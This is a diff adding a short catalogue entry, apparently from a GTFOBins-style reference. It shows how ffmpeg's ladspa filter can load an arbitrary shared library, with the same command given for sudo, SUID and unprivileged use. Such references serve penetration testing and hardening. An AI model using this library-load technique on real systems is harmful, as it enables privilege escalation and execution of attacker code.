@@ -1,0 +1,17 @@
+ffmpeg
+======
+
+Library load
+------------
+
+[Sudo]
+    ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
+reset^J
+
+[SUID]
+    ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
+reset^J
+
+[Unprivileged]
+    ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
+reset^J
